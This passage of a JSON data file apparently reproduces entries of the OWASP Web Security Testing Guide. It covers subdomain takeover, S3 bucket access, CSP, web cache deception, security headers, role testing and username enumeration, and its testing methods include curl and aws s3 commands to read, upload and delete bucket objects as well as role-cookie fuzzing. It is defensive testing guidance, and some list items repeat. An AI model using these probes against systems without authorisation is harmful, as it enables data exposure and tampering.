        "tools": "<h3>Tools</h3><ul><li>dig - man page</li><li>recon-ng - Web Reconnaissance framework</li><li>theHarvester - OSINT intelligence gathering tool</li><li>Sublist3r - OSINT subdomain enumeration tool</li><li>dnsrecon - DNS Enumeration Script</li><li>OWASP Amass DNS enumeration</li><li>OWASP Domain Protect</li></ul><h3>References</h3><ul><li>HackerOne - A Guide To Subdomain Takeovers</li><li>Subdomain Takeover: Basics</li><li>Subdomain Takeover: Going beyond CNAME</li><li>can-i-take-over-xyz - A list of vulnerable services</li><li>OWASP AppSec Europe 2017 - Frans Rosén: DNS hijacking using cloud providers – no verification needed</li></ul>",
        "remediation": "<h3>Remediation</h3><p>To mitigate the risk of subdomain takeover, the vulnerable DNS resource record(s) should be removed from the DNS zone. Continuous monitoring and periodic checks are recommended as best practice.</p>",
        "test_objectives": ""
    },
    "WSTG-CONF-11": {
        "summary": "<h3>Summary</h3><p>Cloud storage services allow web applications and services to store and access objects in the storage service. Improper access control configuration, however, may lead to the exposure of sensitive information, data tampering, or unauthorized access.</p><p>A known example is where an Amazon S3 bucket is misconfigured, although the other cloud storage services may also be exposed to similar risks. By default, all S3 buckets are private and can be accessed only by users who are explicitly granted access. Users can grant public access not only to the bucket itself but also to individual objects stored within that bucket. This may lead to an unauthorized user being able to upload new files, modify or read stored files.</p><h3>Test Objectives</h3><ul><li>Assess that the access control configuration for the storage services is properly in place.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>First, identify the URL to access the data in the storage service, and then consider the following tests:</p><ul><li>read unauthorized data</li><li>upload a new arbitrary file</li></ul><p>You may use curl for the tests with the following commands and see if unauthorized actions can be performed successfully.</p><p>To test the ability to read an object:</p><pre><code>curl -X GET https://<cloud-storage-service>/<object></code></pre><p>To test the ability to upload a file:</p><pre><code>curl -X PUT -d 'test' 'https://<cloud-storage-service>/test.txt'</code></pre><p>In the above command, it is recommended to replace the single quotes (‘) with double quotes (“) when running the command on a Windows machine.</p><p>The Amazon S3 bucket URLs follow one of two formats, either virtual host style or path-style.</p><ul><li>Virtual Hosted Style Access</li></ul><pre><code>https://bucket-name.s3.Region.amazonaws.com/key-name</code></pre><p>In the following example, my-bucket is the bucket name, us-west-2 is the region, and puppy.png is the key-name:</p><pre><code>https://my-bucket.s3.us-west-2.amazonaws.com/puppy.png</code></pre><ul><li>Path-Style Access</li></ul><pre><code>https://s3.Region.amazonaws.com/bucket-name/key-name</code></pre><p>As above, in the following example, my-bucket is the bucket name, us-west-2 is the region, and puppy.png is the key-name:</p><pre><code>https://s3.us-west-2.amazonaws.com/my-bucket/puppy.png</code></pre><p>For some regions, the legacy global endpoint that does not specify a region-specific endpoint can be used. Its format is also either virtual hosted style or path-style.</p><ul><li>Virtual Hosted Style Access</li></ul><pre><code>https://bucket-name.s3.amazonaws.com</code></pre><ul><li>Path-Style Access</li></ul><pre><code>https://s3.amazonaws.com/bucket-name</code></pre><p>For black-box testing, S3 URLs can be found in the HTTP messages. The following example shows a bucket URL is sent in the img tag in an HTTP response.</p><pre><code>... <img src= \"https://my-bucket.s3.us-west-2.amazonaws.com/puppy.png\" > ...</code></pre><p>For gray-box testing, you can obtain bucket URLs from Amazon’s web interface, documents, source code, and any other available sources.</p><p>In addition to testing with curl, you can also test with the AWS command-line tool. In this case s3:// URI scheme is used.</p><p>The following command lists all the objects of the bucket when it is configured public:</p><pre><code>aws s3 ls s3://<bucket-name></code></pre><p>The following is the command to upload a file:</p><pre><code>aws s3 cp arbitrary-file s3://bucket-name/path-to-save</code></pre><p>This example shows the result when the upload has been successful.</p><pre><code>$ aws s3 cp test.txt s3://bucket-name/test.txt\nupload: ./test.txt to s3://bucket-name/test.txt</code></pre><p>This example shows the result when the upload has failed.</p><pre><code>$ aws s3 cp test.txt s3://bucket-name/test.txt\nupload failed: ./test2.txt to s3://bucket-name/test2.txt An error occurred ( AccessDenied ) when calling the PutObject operation: Access Denied</code></pre><p>The following is the command to remove an object:</p><pre><code>aws s3 rm s3://bucket-name/object-to-remove</code></pre>",
        "tools": "<h3>Tools</h3><ul><li>AWS CLI</li></ul><h3>References</h3><ul><li>Working with Amazon S3 Buckets</li><li>flAWS 2 - Learn AWS Security</li><li>curl Tutorial</li></ul>",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-CONF-12": {
        "summary": "<h3>Summary</h3><p>Content Security Policy (CSP) is a declarative allow-list policy enforced through Content-Security-Policy response header or equivalent <meta> element. It allows developers to restrict the sources from which resources such as JavaScript, CSS, images, files etc. are loaded. CSP is an effective defense in depth technique to mitigate the risk of vulnerabilities such as Cross Site Scripting (XSS) and Clickjacking.</p><p>Content Security Policy supports directives which allow granular control to the flow of policies. (See References for further details.)</p><h3>Test Objectives</h3><ul><li>Review the Content-Security-Policy header or meta element to identify misconfigurations.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>To test for misconfigurations in CSPs, look for insecure configurations by examining the Content-Security-Policy HTTP response header or CSP meta element in a proxy tool:</p><ul><li>unsafe-inlinedirective enables inline scripts or styles, making the applications susceptible toXSSattacks.</li><li>unsafe-evaldirective allowseval()to be used in the application and is susceptible to common bypass techniques such as data URL injection.</li><li>unsafe-hashesdirective allows use of inline scripts/styles, assuming they match the specified hashes.</li><li>Resources such as scripts can be allowed to be loaded from any origin by the use wildcard (*) source.Also consider wildcards based on partial matches, such as:https://*or*.cdn.com.Consider whether allow listed sources provide JSONP endpoints which might be used to bypass CSP or same-origin-policy.</li><li>Also consider wildcards based on partial matches, such as:https://*or*.cdn.com.</li><li>Consider whether allow listed sources provide JSONP endpoints which might be used to bypass CSP or same-origin-policy.</li><li>Framing can be enabled for all origins by the use of the wildcard (*) source for theframe-ancestorsdirective. If theframe-ancestorsdirective is not defined in the Content-Security-Policy header it may make applications vulnerable toclickjackingattacks.</li><li>Business critical applications should require to use a strict policy.</li></ul><ul><li>Also consider wildcards based on partial matches, such as:https://*or*.cdn.com.</li><li>Consider whether allow listed sources provide JSONP endpoints which might be used to bypass CSP or same-origin-policy.</li></ul>",
        "tools": "<h3>Tools</h3><ul><li>Google CSP Evaluator</li><li>CSP Auditor - Burp Suite Extension</li><li>CSP Generator Chrome/Firefox</li></ul><h3>References</h3><ul><li>OWASP Content Security Policy Cheat Sheet</li><li>Mozilla Developer Network: Content Security Policy</li><li>CSP Level 3 W3C</li><li>CSP with Google</li><li>Content-Security-Policy</li><li>Google CSP Evaluator</li><li>CSP A Successful Mess Between Hardening And Mitigation</li><li>The unsafe-hashes Source List Keyword</li></ul>",
        "remediation": "<h3>Remediation</h3><p>Configure a strong content security policy which reduces the attack surface of the application. Developers can verify the strength of content security policy using online tools such as Google CSP Evaluator .</p><p>A strict policy is a policy which provides protection against classical stored, reflected, and some of the DOM XSS attacks and should be the optimal goal of any team trying to implement CSP.</p><p>Google went ahead and set up a guide to adopt a strict CSP based on nonces. Based on a presentation at LocoMocoSec , the following two policies can be used to apply a strict policy:</p><p>Moderate Strict Policy:</p><pre><code>script-src 'nonce-r4nd0m' 'strict-dynamic';\nobject-src 'none'; base-uri 'none';</code></pre><p>Locked down Strict Policy:</p><pre><code>script-src 'nonce-r4nd0m';\nobject-src 'none'; base-uri 'none';</code></pre><ul><li>script-srcdirective is used to restrict the sources from which scripts can be loaded and executed.</li><li>object-srcdirective is used to restrict the sources from which objects can be loaded and executed.</li><li>base-uridirective specifies the base URL for resolving relative URLs in the page. Without this directive, the page becomes vulnerable to HTML base tag injection attacks.</li></ul>",
        "test_objectives": ""
    },
    "WSTG-CONF-13": {
        "summary": "<h3>Summary</h3><p>Proper configuration of application paths is important because, if paths are not configured correctly, they allow an attacker to exploit other vulnerabilities at a later stage using this misconfiguration.</p><p>For example, if the routes are not configured correctly and the target also uses a CDN, the attacker can use this misconfiguration to execute web cache deception attacks.</p><p>As a result, to prevent other attacks, this configuration should be evaluated by the tester.</p><h3>Test Objectives</h3><ul><li>Make sure application paths are configured correctly.</li></ul>",
        "how-to": "<h3>How To Test</h3><p>In a black-box testing scenario, the tester should replace all the existing paths with paths that do not exist, and then examine the behavior and status code of the target.</p><p>For example, there is a path in the application that is a dashboard and shows the amount of the user’s account balance (money, game credits, etc).</p><p>Assume the path is https://example.com/user/dashboard , the tester should test the different modes that the developer may have considered for this path. For Web Cache Deception vulnerabilities the analyst should consider a path such as https:// example.com/user/dashboard/non.js if dashboard information is visible, and the target uses a CDN (or other web cache), then Web Cache Deception attacks are likely applicable.</p><p>Examine the application routing configuration, Most of the time, developers use regular expressions in application routing.</p><p>In this example, in the urls.py file of a Django framework application, we see an example of Path Confusion. The developer did not use the correct regular expression resulting in a vulnerability:</p><pre><code>from django.urls import re_path from . import views urlpatterns = [ re_path ( r '.*^dashboard' , views . path_confusion , name = 'index' ), ]</code></pre><p>If the path https://example.com/dashboard/none.js is also opened by the user in the browser, the user dashboard information can be displayed, and if the target uses a CDN or web cache, a Web Cache Deception attack can be implemented.</p>",
        "tools": "<h3>Tools</h3><ul><li>Zed Attack Proxy</li><li>Burp Suite</li></ul>",
        "remediation": "<h3>Remediation</h3><ul><li>Refrain from classify/handling cached based on file extension or path (leverage content-type).</li><li>Ensure the caching mechanism(s) adhere to cache-control headers specified by your application.</li><li>Implement RFC compliant File Not Found handling and redirects.</li></ul><h3>References</h3><ul><li>Bypassing Web Cache Poisoning Countermeasures</li><li>Path confusion: Web cache deception threatens user information online</li><li>Web Cache Deception Attack</li></ul>",
        "test_objectives": ""
    },
    "WSTG-CONF-14": {
        "summary": "<h3>Summary</h3><p>Security headers play a vital role in protecting web applications from a wide range of attacks, including Cross-Site Scripting (XSS), Clickjacking, and data injection attacks. These headers instruct the browser on how to handle security-related aspects of a website’s communication, reducing exposure to known attack vectors. However, misconfigurations can lead to vulnerabilities, weakening the intended security protections or rendering them ineffective. This section outlines common security header misconfigurations, their risks, and how to properly test for them.</p><h3>Test Objectives</h3><ul><li>Identify improperly configured security headers.</li><li>Assess the impact of misconfigured security headers.</li><li>Validate the correct implementation of required security headers.</li></ul><h3>Common Security Header Misconfigurations</h3><ul><li>Security Header with an Empty Value:Headers that are present but lack a value may be ignored by browsers, making them ineffective.</li><li>Security Header with an Invalid Value or Name (Typos):Incorrect header names or misspellings result in headers not being recognized or enforced.</li><li>Overpermissive Security Headers:Headers configured too broadly (e.g., using wildcard characters*or overly permissive directives) can leak information or allow access to resources beyond the intended scope.</li><li>Duplicate Security Headers:Multiple occurrences of the same header with conflicting values can lead to unpredictable browser behavior, potentially disabling the security measures entirely.</li><li>Legacy or Deprecated Headers:Inclusion of obsolete headers (e.g., HPKP) or directives (e.g.,ALLOW-FROMin X-Frame-Options) that are no longer supported by modern browsers may create unnecessary risks.</li><li>Invalid Placement of Security Headers:Some headers are only effective under specific conditions. For example, headers like HSTS must be delivered over HTTPS; if sent over HTTP, they become ineffective.</li><li>META Tag Handling Mistakes:In cases where security policies such as Content-Security-Policy (CSP) are enforced via both HTTP headers and META tags (usinghttp-equiv), there is a risk that the META tag value might override or conflict with the secure logic defined in the HTTP header. This can lead to a scenario where an insecure policy inadvertently takes precedence, weakening the overall security posture.</li></ul><h3>Risks of Misconfigured Security Headers</h3><ul><li>Reduced Effectiveness:Misconfigured headers might not provide the intended protection, leaving the application vulnerable to attacks such as XSS, Clickjacking, or CORS-related exploits.</li><li>Breakage of Security Measures:Duplicate headers or conflicting directives can result in browsers ignoring the HTTP security headers entirely, thereby disabling the intended protections.</li><li>Introduction of New Attack Vectors:The use of legacy or deprecated headers may introduce risks rather than mitigate them if modern browsers no longer support the intended security measures.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>To inspect the security headers used by an application, employ the following methods:</p><ul><li>Intercepting Proxies:Use tools such asBurp Suiteto analyze server responses.</li><li>Command Line Tools:Execute a curl command to retrieve HTTP response headers:curl -I https://example.comSometimes the web application will redirect to a new page, in order to follow redirect use the following command:curl -L -I https://example.comSome Firewalls may block curl’s default User-Agent and some TLS/SSL errors will also prevent it from returning the correct information, in thise case you could try to use the following command:curl -I -L -k --user-agent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36\" https://example.com</li><li>Sometimes the web application will redirect to a new page, in order to follow redirect use the following command:curl -L -I https://example.com</li><li>Some Firewalls may block curl’s default User-Agent and some TLS/SSL errors will also prevent it from returning the correct information, in thise case you could try to use the following command:curl -I -L -k --user-agent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36\" https://example.com</li><li>Browser Developer Tools:Open developer tools (F12), navigate to theNetworktab, select a request, and view theHeaderssection.</li></ul><ul><li>Sometimes the web application will redirect to a new page, in order to follow redirect use the following command:curl -L -I https://example.com</li><li>Some Firewalls may block curl’s default User-Agent and some TLS/SSL errors will also prevent it from returning the correct information, in thise case you could try to use the following command:curl -I -L -k --user-agent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36\" https://example.com</li></ul><ul><li>Identify Risky Headers:Look for headers that could allow excessive access, such as:</li><li>Evaluate Directives:Verify whether strict directives are enforced. For example, an overpermissive setup might appear as:Access-Control-Allow-Origin: *\n  Access-Control-Allow-Credentials: true\n  X-Permitted-Cross-Domain-Policies: all\n  Referrer-Policy: unsafe-urlA safe configuration would look like:Access-Control-Allow-Origin: {theallowedoriginurl}\n  X-Permitted-Cross-Domain-Policies: none\n  Referrer-Policy: no-referrer</li><li>Cross-Reference Documentation:Use resources such as theMozilla Developer Network: Security Headersto review secure and insecure directives.</li></ul><p>Evaluate Directives: Verify whether strict directives are enforced. For example, an overpermissive setup might appear as:</p><pre><code>Access-Control-Allow-Origin: *\n  Access-Control-Allow-Credentials: true\n  X-Permitted-Cross-Domain-Policies: all\n  Referrer-Policy: unsafe-url</code></pre><p>A safe configuration would look like:</p><pre><code>Access-Control-Allow-Origin: {theallowedoriginurl}\n  X-Permitted-Cross-Domain-Policies: none\n  Referrer-Policy: no-referrer</code></pre><ul><li>Duplicate Headers:Ensure that the same header is not defined multiple times with conflicting values.</li><li>Obsolete Headers:Identify and remove deprecated headers (e.g., HPKP) and outdated directives (e.g.,ALLOW-FROMin X-Frame-Options). Refer to sources likeMozilla Developer Network: X-Frame-Optionsfor current standards.</li></ul><ul><li>Protocol-Specific Requirements:Validate that headers intended for secure contexts (e.g., HSTS) are delivered only under appropriate conditions (i.e., over HTTPS).</li><li>Conditional Delivery:Some headers may only be effective under specific circumstances. Verify that these conditions are met for the header to function as intended.</li></ul><ul><li>Dual Enforcement Checks:When a security policy like CSP is applied through both an HTTP header and a META tag usinghttp-equiv, confirm that the HTTP header (which is generally considered more authoritative) is not inadvertently overridden by the META tag.</li><li>Review Browser Behavior:Test the application in various browsers to see if any differences occur due to the presence of conflicting directives. Where possible, avoid using dual definitions to prevent unintended security lapses.</li></ul>",
        "tools": "<h3>Tools</h3><ul><li>Mozilla Observatory</li><li>ZAP</li><li>Burp Suite</li><li>Browser Developer Tools (Chrome, Firefox, Edge)</li></ul><h3>References</h3><ul><li>OWASP Secure Headers Project</li><li>Mozilla Developer Network: Security Headers</li><li>RFC 6797 - HTTP Strict Transport Security (HSTS)</li><li>Google Web Security Guidelines</li><li>HPKP is No More</li></ul>",
        "remediation": "<h3>Remediation</h3><ul><li>Correct Header Configuration:Ensure that headers are correctly implemented with proper values and no typos.</li><li>Enforce Strict Directives:Configure headers with the most secure settings that still allow for required functionality. For example, avoid using*in CORS policies unless absolutely necessary.</li><li>Remove Deprecated Headers:Replace legacy security headers with modern equivalents and remove any that are no longer supported.</li><li>Avoid Conflicting Definitions:Prevent duplicate header definitions and ensure that META tags do not conflict with HTTP headers for security policies.</li></ul>",
        "test_objectives": ""
    },
    "WSTG-IDNT-01": {
        "summary": "<h3>Summary</h3><p>Applications have several types of functionalities and services, and those require access permissions based on the needs of the user. That user could be:</p><ul><li>an administrator, where they manage the application functionalities.</li><li>an auditor, where they review the application transactions and provide a detailed report.</li><li>a support engineer, where they help customers debug and fix issues on their accounts.</li><li>a customer, where they interact with the application and benefit from its services.</li></ul><p>In order to handle these uses and any other use case for that application, role definitions are setup (more commonly known as RBAC ). Based on these roles, the user is capable of accomplishing the required task.</p><h3>Test Objectives</h3><ul><li>Identify and document roles used by the application.</li><li>Attempt to switch, change, or access another role.</li><li>Review the granularity of the roles and the needs behind the permissions given.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>The tester should start by identifying the application roles being tested through any of the following methods:</p><ul><li>Application documentation.</li><li>Guidance by the developers or administrators of the application.</li><li>Application comments.</li><li>Fuzz possible roles:cookie variable (e.g.role=admin,isAdmin=True)account variable (e.g.Role: manager)hidden directories or files (e.g./admin,/mod,/backups)switching to well known users (e.g.admin,backups, etc.)</li><li>cookie variable (e.g.role=admin,isAdmin=True)</li><li>account variable (e.g.Role: manager)</li><li>hidden directories or files (e.g./admin,/mod,/backups)</li><li>switching to well known users (e.g.admin,backups, etc.)</li></ul><ul><li>cookie variable (e.g.role=admin,isAdmin=True)</li><li>account variable (e.g.Role: manager)</li><li>hidden directories or files (e.g./admin,/mod,/backups)</li><li>switching to well known users (e.g.admin,backups, etc.)</li></ul><p>After identifying possible attack vectors, the tester needs to test and validate that they can access the available roles.</p><p>Some applications define the roles of the user on creation, through rigorous checks and policies, or by ensuring that the user’s role is properly protected through a signature created by the backend. Finding that roles exist doesn’t mean that they’re a vulnerability.</p><p>After gaining access to the roles on the system, the tester must understand the permissions provided to each role.</p><p>A support engineer shouldn’t be able to conduct administrative functionalities, manage the backups, or conduct any transactions in the place of a user.</p><p>An administrator shouldn’t have full powers on the system. Sensitive admin functionality should leverage a maker-checker principle, or use MFA to ensure that the administrator is conducting the transaction. A clear example on this was the Twitter incident in 2020 .</p>",
        "tools": "<h3>Tools</h3><p>The above mentioned tests can be conducted without the use of any tool, except the one being used to access the system.</p><p>To make things easier and more documented, one can use:</p><ul><li>Burp’s Autorize extension</li><li>ZAP’s Access Control Testing add-on</li></ul><h3>References</h3><ul><li>Role Engineering for Enterprise Security Management, E Coyne & J Davis, 2007</li><li>Role engineering and RBAC standards</li></ul>",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-IDNT-02": {
        "summary": "<h3>Summary</h3><p>Some websites offer a user registration process that automates (or semi-automates) the provisioning of system access to users. The identity requirements for access vary from positive identification to none at all, depending on the security requirements of the system. Many public applications completely automate the registration and provisioning process because the size of the user base makes it impossible to manage manually. However, many corporate applications will provision users manually, so this test case may not apply.</p><h3>Test Objectives</h3><ul><li>Verify that the identity requirements for user registration are aligned with business and security requirements.</li><li>Validate the registration process.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Verify that the identity requirements for user registration are aligned with business and security requirements:</p><p>Validate the registration process:</p><p>In the WordPress example below, the only identification requirement is an email address that is accessible to the registrant.</p><p>Figure 4.3.2-1: WordPress Registration Page</p><br><p>In contrast, in the Google example below the identification requirements include name, date of birth, country, mobile phone number, email address and CAPTCHA response. While only two of these can be verified (email address and mobile number), the identification requirements are stricter than WordPress.</p><p>Figure 4.3.2-2: Google Registration Page</p><br>",
        "tools": "<h3>Tools</h3><p>A HTTP proxy can be a useful tool to test this control.</p><h3>References</h3><p>User Registration Design</p>",
        "remediation": "<h3>Remediation</h3><p>Implement identification and verification requirements that correspond to the security requirements of the information the credentials protect.</p>",
        "test_objectives": ""
    },
    "WSTG-IDNT-03": {
        "summary": "<h3>Summary</h3><p>The provisioning of accounts presents an opportunity for an attacker to create a valid account without application of the proper identification and authorization process.</p><h3>Test Objectives</h3><ul><li>Verify which accounts may provision other accounts and of what type.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Determine which roles are able to provision users and what sort of accounts they can provision.</p><ul><li>Is there any verification, vetting and authorization of provisioning requests?</li><li>Is there any verification, vetting and authorization of de-provisioning requests?</li><li>Can an administrator provision other administrators or just users?</li><li>Can an administrator or other user provision accounts with privileges greater than their own?</li><li>Can an administrator or user de-provision themselves?</li><li>How are the files or resources owned by the de-provisioned user managed? Are they deleted? Is access transferred?</li></ul><p>In WordPress, only a user’s name and email address are required to provision the user, as shown below:</p><p>Figure 4.3.3-1: WordPress User Add</p><br><p>De-provisioning of users requires the administrator to select the users to be de-provisioned, select Delete from the dropdown menu (circled) and then applying this action. The administrator is then presented with a dialog box asking what to do with the user’s posts (delete or transfer them).</p><p>Figure 4.3.3-2: WordPress Auth and Users</p><br>",
        "tools": "<h3>Tools</h3><p>While the most thorough and accurate approach to completing this test is to conduct it manually, HTTP proxy tools could be also useful.</p>",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-IDNT-04": {
        "summary": "<h3>Summary</h3><p>The scope of this test is to verify if it is possible to collect a set of valid usernames by interacting with the authentication mechanism of the application. This test will be useful for brute force testing, in which the tester verifies if, given a valid username, it is possible to find the corresponding password.</p><p>Often, web applications reveal when a username exists on system, either as a consequence of mis-configuration or as a design decision. For example, sometimes, when we submit wrong credentials, we receive a message that states that either the username is present on the system or the provided password is wrong. The information obtained can be used by an attacker to gain a list of users on system. This information can be used to attack the web application, for example, through a brute force or default username and password attack.</p><p>The tester should interact with the authentication mechanism of the application to understand if sending particular requests causes the application to answer in different manners. This issue exists because the information released from web application or web server when the user provides a valid username is different than when they use an invalid one.</p><p>In some cases, a message is received that reveals if the provided credentials are wrong because an invalid username or an invalid password was used. Sometimes, testers can enumerate the existing users by sending a username and an empty password.</p><h3>Test Objectives</h3><ul><li>Review processes that pertain to user identification (e.g.registration, login, etc.).</li><li>Enumerate users where possible through response analysis.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>In black-box testing, the tester knows nothing about the specific application, username, application logic, error messages on log in page, or password recovery facilities. If the application is vulnerable, the tester receives a response message that reveals, directly or indirectly, some information useful for enumerating users.</p><p>Record the server answer when you submit a valid user ID and valid password.</p><p>Using a web proxy, notice the information retrieved from this successful authentication (HTTP 200 Response, length of the response).</p><p>Now, the tester should try to insert a valid user ID and a wrong password and record the error message generated by the application.</p><p>The browser should display a message similar to the following one:</p><p>Figure 4.3.4-1: Authentication Failed</p><br><p>Unlike any message that reveals the existence of the user like the following:</p><p>Login for User foo: invalid password</p><p>Using a web proxy, notice the information retrieved from this unsuccessful authentication attempt (HTTP 200 Response, length of the response).</p><p>Now, the tester should try to insert an invalid user ID and a wrong password and record the server answer (the tester should be confident that the username is not valid in the application). Record the error message and the server answer.</p><p>If the tester enters a nonexistent user ID, they can receive a message similar to:</p><p>Figure 4.3.4-3: This User is Not Active</p><br><p>or a message like the following one:</p><p>Login failed for User foo: invalid Account</p><p>Generally the application should respond with the same error message and length to the different incorrect requests. If the responses are not the same, the tester should investigate and find out the key that creates a difference between the two responses. For example:</p><p>The above responses let the client understand that for the first request they have a valid username. So they can interact with the application requesting a set of possible user IDs and observing the answer.</p><p>Looking at the second server response, the tester understand in the same way that they don’t hold a valid username. So they can interact in the same manner and create a list of valid user ID looking at the server answers.</p><p>Testers can enumerate users in several ways, such as:</p><p>Some web application release a specific error code or message that we can analyze.</p><p>For example:</p><ul><li>https://www.foo.com/err.jsp?User=baduser&Error=0</li><li>https://www.foo.com/err.jsp?User=gooduser&Error=2</li></ul><p>As is seen above, when a tester provides a user ID and password to the web application, they see a message indication that an error has occurred in the URL. In the first case they have provided a bad user ID and bad password. In the second, a good user ID and a bad password, so they can identify a valid user ID.</p><p>Sometimes a web server responds differently if it receives a request for an existing directory or not. For instance in some portals every user is associated with a directory. If testers try to access an existing directory they could receive a web server error.</p><p>Some of the common errors received from web servers are:</p><ul><li>403 Forbidden error code</li><li>404 Not found error code</li></ul><p>Example:</p><ul><li>https://www.foo.com/account1- we receive from web server: 403 Forbidden</li><li>https://www.foo.com/account2- we receive from web server: 404 file Not Found</li></ul><p>In the first case the user exists, but the tester cannot view the web page, in second case instead the user “account2” does not exist. By collecting this information testers can enumerate the users.</p><p>Testers can receive useful information on Title of web page, where they can obtain a specific error code or messages that reveal if the problems are with the username or password.</p><p>For instance, if a user cannot authenticate to an application and receives a web page whose title is similar to:</p><ul><li>Invalid user</li><li>Invalid authentication</li></ul><p>When we use a recovery facility (i.e. a forgotten password function) a vulnerable application might return a message that reveals if a username exists or not.</p><p>For example, messages similar to the following:</p><ul><li>Invalid username: email address is not valid or the specified user was not found.</li><li>Valid username: Your password has been successfully sent to the email address you registered with.</li></ul><p>When we request a user within the directory that does not exist, we don’t always receive 404 error code. Instead, we may receive “200 OK” with an image, in this case we can assume that when we receive the specific image the user does not exist. This logic can be applied to other web server response; the trick is a good analysis of web server and web application messages.</p><p>As well as looking at the content of the responses, the time that the response takes should also be considered. Particularly where the request causes an interaction with an external service (such as sending a forgotten password email), this can add several hundred milliseconds to the response, which can be used to determine whether the requested user is valid.</p><p>In some cases the user IDs are created with specific policies of administrator or company. For example we can view a user with a user ID created in sequential order:</p><pre><code>CN000100\nCN000101\n...</code></pre><p>Sometimes the usernames are created with a REALM alias and then a sequential numbers:</p><ul><li>R1001 – user 001 for REALM1</li><li>R2001 – user 001 for REALM2</li></ul><p>In the above sample we can create simple shell scripts that compose user IDs and submit a request with tool like wget to automate a web query to discern valid user IDs. To create a script we can also use Perl and curl.</p><p>Other possibilities are: - user IDs associated with credit card numbers, or in general numbers with a pattern. - user IDs associated with real names, e.g. if Freddie Mercury has a user ID of “fmercury”, then you might guess Roger Taylor to have the user ID of “rtaylor”.</p><p>Again, we can guess a username from the information received from an LDAP query or from Google information gathering, for example, from a specific domain. Google can help to find domain users through specific queries or through a simple shell script or tool.</p><p>By enumerating user accounts, you risk locking out accounts after a predefined number of failed probes (based on application policy). Also, sometimes, your IP address can be banned by dynamic rules on the application firewall or Intrusion Prevention System.</p><p>Ensure that unregistered users are unable to select reserved usernames (e.g., admin, administrator, moderator) during the registration process. Additionally, verify that users cannot edit their current username to one of these reserved usernames on the profile editing page.</p><p>If the web application has features that allow a user to access the web application’s registration and profile editing functionality, the interactions to test include the following:</p><ul><li>Registration process:Access the registration page as an unregistered user and fill in the registration form, entering one of the reserved usernames (e.g., admin, administrator, moderator), submit the registration form, and then verify the response.The registration process should reject the form submission and display an error message indicating that the selected username is not available for registration.</li><li>Access the registration page as an unregistered user and fill in the registration form, entering one of the reserved usernames (e.g., admin, administrator, moderator), submit the registration form, and then verify the response.</li><li>The registration process should reject the form submission and display an error message indicating that the selected username is not available for registration.</li><li>Profile editing page:Log into the web application using valid credentials and navigate to the profile editing page. Attempt to change the current username to one of the reserved usernames (e.g., admin, administrator, moderator) and save the changes to verify the behavior.The profile editing process should reject the username change request and display an error message indicating that the selected username is not available.</li><li>Log into the web application using valid credentials and navigate to the profile editing page. Attempt to change the current username to one of the reserved usernames (e.g., admin, administrator, moderator) and save the changes to verify the behavior.</li><li>The profile editing process should reject the username change request and display an error message indicating that the selected username is not available.</li><li>Test for variants and similarities:Repeat the above steps for different variations of the reserved usernames (e.g., Admin, ADMIN, Administrator) and perform tests with different combinations of uppercase and lowercase letters to ensure case insensitivity is handled correctly.The web application should treat these variants as identical to the reserved usernames, rejecting their selection or modification.</li><li>Repeat the above steps for different variations of the reserved usernames (e.g., Admin, ADMIN, Administrator) and perform tests with different combinations of uppercase and lowercase letters to ensure case insensitivity is handled correctly.</li><li>The web application should treat these variants as identical to the reserved usernames, rejecting their selection or modification.</li></ul><ul><li>Access the registration page as an unregistered user and fill in the registration form, entering one of the reserved usernames (e.g., admin, administrator, moderator), submit the registration form, and then verify the response.</li><li>The registration process should reject the form submission and display an error message indicating that the selected username is not available for registration.</li></ul><ul><li>Log into the web application using valid credentials and navigate to the profile editing page. Attempt to change the current username to one of the reserved usernames (e.g., admin, administrator, moderator) and save the changes to verify the behavior.</li><li>The profile editing process should reject the username change request and display an error message indicating that the selected username is not available.</li></ul><ul><li>Repeat the above steps for different variations of the reserved usernames (e.g., Admin, ADMIN, Administrator) and perform tests with different combinations of uppercase and lowercase letters to ensure case insensitivity is handled correctly.</li><li>The web application should treat these variants as identical to the reserved usernames, rejecting their selection or modification.</li></ul><p>Verify that the application answers in the same manner for every client request that produces a failed authentication. For this issue the black-box testing and gray-box testing have the same concept based on the analysis of messages or error codes received from web application.</p><p>The application should answer in the same manner for every failed attempt of authentication.</p><p>For Example: Credentials submitted are not valid</p>",
        "tools": "<h3>Tools</h3><ul><li>Zed Attack Proxy (ZAP)</li><li>curl</li><li>PERL</li></ul><h3>References</h3><ul><li>Username Enumeration Vulnerabilities</li><li>Prevent WordPress Username Enumeration</li><li>Marco Mella, Sun Java Access & Identity Manager Users enumeration</li></ul>",
        "remediation": "<h3>Remediation</h3><p>Ensure the application returns consistent generic error messages in response to invalid account name, password or other user credentials entered during the log in process.</p><p>Ensure default system accounts and test accounts are deleted prior to releasing the system into production (or exposing it to an untrusted network).</p>",
        "test_objectives": ""
    },
    "WSTG-IDNT-05": {
        "summary": "<h3>Summary</h3><p>User account names are often highly structured (e.g. Joe Bloggs account name is jbloggs and Fred Nurks account name is fnurks) and valid account names can easily be guessed.</p><h3>Test Objectives</h3><ul><li>Determine whether a consistent account name structure renders the application vulnerable to account enumeration.</li><li>Determine whether the application’s error messages permit account enumeration.</li></ul>",
        "how-to": "<h3>How to Test</h3><ul><li>Determine the structure of account names.</li><li>Evaluate the application’s response to valid and invalid account names.</li><li>Use different responses to valid and invalid account names to enumerate valid account names.</li><li>Use account name dictionaries to enumerate valid account names.</li></ul>",
        "tools": "",
        "remediation": "<h3>Remediation</h3><p>Ensure the application returns consistent generic error messages in response to invalid account name, password or other user credentials entered during the log in process.</p>",
        "test_objectives": ""
    },
    "WSTG-ATHN-01": {
        "summary": "",
        "how-to": "",
        "tools": "",
        "remediation": "",
